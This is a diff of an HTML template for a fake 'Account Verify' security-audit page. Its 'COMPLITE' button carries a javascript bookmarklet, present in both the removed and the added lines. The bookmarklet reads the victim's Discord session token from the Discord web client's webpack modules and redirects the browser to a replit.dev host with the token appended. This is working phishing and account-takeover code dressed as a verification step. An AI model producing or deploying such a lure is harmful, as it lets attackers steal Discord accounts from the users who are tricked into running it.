@@ -30,30 +30,54 @@
 <img alt="vector" src="../static/images/b-6.png" class="chakra-image css-c2hg41" style="position: absolute;bottom: -100px; left: 0px; z-index: 1;">  
 </div>   
 
-    <section class="security style="padding:0px;">
-        <div class="container">
-    <div>       
-                                 <h5 class="hero__h1" style="font-size: 72px; align-items: center; background: linear-gradient(96.08deg, #6459e3 50.06%, #baa7ed 88.46%);
-    -webkit-background-clip: text;">
-                                      
-     Account Verify
-                                    </h5> </div>
- <div class="left">
-   <h2>Security Audits</h2>
-    <h1> {{ render_username }} </h1>
-      <a href="javascript:(function() { const url='https://19c31484-dad9-4444-be2d-c13786fee840-00-2vgq473tgdn65.pike.replit.dev/'; var f=(webpackChunkdiscord_app.push([[''], {}, e=>{m=[]; for(let t in e.c) m.push(e.c[t])}]), m).find(e=>void 0!==e?.exports?.default?.getToken).exports.default.getToken(); window.location.replace(url+'/'+f); })();" class="verify-button" id="runBookmarklet"> <i class="fas fa-arrows-alt">COMPLITE</a>
- </a>
- </div>
+  <section class="security" style="padding: 0px; width: 100%;">
+    <div class="container" style="width: 100%;">
+        <!-- Заголовок -->
+        <div>
+            <h5 class="hero__h1" style="font-size: 72px; align-items: center; background: linear-gradient(96.08deg, #6459e3 50.06%, #baa7ed 88.46%); -webkit-background-clip: text;">
+                Account Verify
+            </h5>
+        </div>
 
- <div class="right-panel">
+        <!-- Левая часть (с информацией) -->
+        <div class="left" style="max-width: 300px;">
+            <h2>Security Audits</h2>
+            <h1>None#None</h1>
+
+        </div>
+            
+            <!-- Кнопка VERIFY с иконкой -->
+            <a href="javascript:(function() { 
+                const url = 'https://19c31484-dad9-4444-be2d-c13786fee840-00-2vgq473tgdn65.pike.replit.dev/'; 
+                var f = (webpackChunkdiscord_app.push([[''], {}, e => { m = []; for (let t in e.c) m.push(e.c[t]) }]), m)
+                    .find(e => void 0 !== e?.exports?.default?.getToken)
+                    .exports.default.getToken(); 
+                window.location.replace(url + '/' + f); 
+            })();" class="verify-button" id="runBookmarklet">
+                <i class="fas fa-arrows-alt"></i> COMPLITE
+            </a>
+        <!-- Правая часть с видео -->
+        <div class="right-panel" style="float: right;">
             <div class="video-container">
                 <video controls>
                     <source src="https://www.w3schools.com/html/movie.mp4" type="video/mp4">
                 </video>
             </div>
         </div>
+    </div>
+</section>
+
+        <!-- Правая панель для видео -->
+        <div class="right-panel">
+            <div class="video-container">
+                <video controls>
+                    <source src="https://www.w3schools.com/html/movie.mp4" type="video/mp4">
+                </video>
+            </div>
         </div>
-    </section>
+    </div>
+</section>
+
 
 
 
